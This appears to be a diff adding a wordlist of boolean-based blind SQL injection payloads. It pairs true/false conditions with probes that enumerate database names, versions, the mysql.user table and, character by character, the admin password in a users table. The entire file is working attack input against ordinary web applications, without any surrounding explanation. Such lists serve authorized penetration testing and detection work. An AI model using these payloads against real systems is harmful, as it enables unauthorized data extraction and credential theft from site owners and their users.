@@ -1,0 +1,95 @@
+' AND '1'='1
+' AND '1'='2
+' OR '1'='1
+' OR '1'='2
+' AND 1=1--
+' AND 1=2--
+' OR 1=1--
+' OR 1=2--
+" AND "1"="1
+" AND "1"="2
+" OR "1"="1
+" OR "1"="2
+') AND ('1'='1
+') AND ('1'='2
+') OR ('1'='1
+') OR ('1'='2
+")) AND (("1"="1
+")) AND (("1"="2
+")) OR (("1"="1
+")) OR (("1"="2
+' AND (SELECT COUNT(*) FROM users)>0--
+' AND (SELECT COUNT(*) FROM information_schema.tables)>10--
+' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1--
+' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65--
+' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90--
+' AND (SELECT 1 FROM dual) IS NOT NULL--
+' AND EXISTS(SELECT 1 FROM users WHERE username='admin')--
+' AND EXISTS(SELECT * FROM users)--
+' AND (SELECT 'a' FROM users LIMIT 1)='a'--
+' AND (SELECT 'a' FROM users WHERE username='admin')='a'--
+' AND LENGTH(DATABASE())>0--
+' AND SUBSTRING(DATABASE(),1,1)='a'--
+' AND ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20) FROM users ORDER BY id LIMIT 0,1),1,1))>64--
+' AND (SELECT COUNT(*) FROM mysql.user)>0--
+' AND (SELECT user FROM mysql.user LIMIT 1)='root'--
+' AND 1=(SELECT COUNT(*) FROM tabname)--
+' AND 1=(SELECT COUNT(*) FROM tablenames)--
+' RLIKE (SELECT (CASE WHEN (1=1) THEN 1 ELSE 0x28 END))--
+' RLIKE (SELECT (CASE WHEN (1=2) THEN 1 ELSE 0x28 END))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--
+' AND 1=IF(1=1,1,0)--
+' AND 1=IF(1=2,1,0)--
+' AND CASE WHEN (1=1) THEN 1 ELSE 0 END--
+' AND CASE WHEN (1=2) THEN 1 ELSE 0 END--
+' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)--
+' AND (SELECT CASE WHEN (1=2) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)--
+' AND 1=(CASE WHEN (ASCII(SUBSTRING((SELECT DATABASE()),1,1))>64) THEN 1 ELSE 0 END)--
+' AND 'a'=(SELECT CASE WHEN (1=1) THEN 'a' ELSE 'b' END)--
+' AND 'a'=(SELECT CASE WHEN (1=2) THEN 'a' ELSE 'b' END)--
+' AND (SELECT (CASE WHEN (1234=1234) THEN NULL ELSE CAST(1234 AS INT) END)) IS NULL--
+' AND (SELECT (CASE WHEN (1234=4321) THEN NULL ELSE CAST(1234 AS INT) END)) IS NULL--
+' AND 1 IN (SELECT 1)--
+' AND 'a' IN (SELECT 'a')--
+' AND 1 IN (SELECT COUNT(*) FROM users)--
+' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2) AS x)=2--
+' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3) AS x)=3--
+' AND 1 LIKE 1--
+' AND 'a' LIKE 'a'--
+' AND DATABASE() LIKE '%'--
+' AND USER() LIKE '%'--
+' AND VERSION() LIKE '%'--
+' AND (SELECT 1 FROM users WHERE 1=1)=1--
+' AND (SELECT 1 FROM users WHERE 1=2)=1--
+' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
+' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')>64--
+' AND (SELECT LENGTH(password) FROM users WHERE username='admin')>5--
+' AND MID(VERSION(),1,1)='5'--
+' AND MID(VERSION(),1,1)='8'--
+' AND CONV(HEX(SUBSTRING(USER(),1,1)),16,10)>64--
+' AND CONV(HEX(SUBSTRING(DATABASE(),1,1)),16,10)>64--
+' AND BINARY SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
+' AND BINARY SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='A'--
+' AND (SELECT BIT_LENGTH(USER()))>0--
+' AND (SELECT CHAR_LENGTH(DATABASE()))>0--
+' AND (SELECT OCTET_LENGTH(VERSION()))>0--
+' AND STRCMP((SELECT 'a'),'a')=0--
+' AND STRCMP((SELECT 'a'),'b')!=0--
+' AND FIELD('a',(SELECT 'a'))=1--
+' AND FIELD('b',(SELECT 'a'))=0--
+' AND FIND_IN_SET('a',(SELECT 'a,b,c'))=1--
+' AND FIND_IN_SET('d',(SELECT 'a,b,c'))=0--
+' AND INSTR((SELECT 'abcdef'),'abc')=1--
+' AND INSTR((SELECT 'abcdef'),'xyz')=0--
+' AND LOCATE('a',(SELECT 'abc'))=1--
+' AND LOCATE('z',(SELECT 'abc'))=0--
+' AND POSITION('a' IN (SELECT 'abc'))=1--
+' AND POSITION('z' IN (SELECT 'abc'))=0--
+' AND (SELECT 1 WHERE 1=1)=1--
+' AND (SELECT 1 WHERE 1=2) IS NULL--
+' AND (SELECT COUNT(*) FROM users WHERE 1=1)>0--
+' AND (SELECT COUNT(*) FROM users WHERE 1=2)=0--
+' AND (SELECT MIN(id) FROM users)>0--
+' AND (SELECT MAX(id) FROM users)>0--
+' AND (SELECT SUM(id) FROM users)>0--
+' AND (SELECT AVG(id) FROM users)>0--
